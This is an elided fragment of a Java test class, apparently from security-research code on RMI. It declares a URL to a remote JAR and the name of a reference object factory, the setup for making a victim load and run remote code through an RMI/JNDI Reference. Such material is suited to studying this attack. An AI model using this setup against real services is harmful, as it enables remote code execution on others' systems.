...
import com.anbai.sec.rmi.RMIServerTest;
...
public class RMIReferenceServerTest {
    ...
    public static String url = "http://" + RMIServerTest.RMI_HOST + ":8080/MainAbc_2222222222222.jar";

    public static String className = "jar_test.ReferenceObjectFactory";
